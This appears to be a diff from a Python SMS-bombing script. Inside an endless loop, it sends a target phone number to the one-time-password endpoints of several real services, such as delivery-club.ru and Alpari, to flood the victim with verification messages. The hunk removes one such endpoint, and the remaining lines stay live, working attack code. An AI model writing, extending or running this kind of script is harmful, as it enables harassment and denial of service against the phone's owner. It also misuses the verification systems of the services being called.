@@ -379,13 +379,6 @@ while True:
 		print('[+] Alpari Requests Successful!')
 	except:
 		print('[-] Alpari Requests Failed!')
-
-	try:
-		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
-		print('[+] SMS Requests Successful!')
-	except:
-		print('[-] SMS Requests Failed!')
-
 	try:
 		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
 		print('[+] Delivery Requests Successful!')
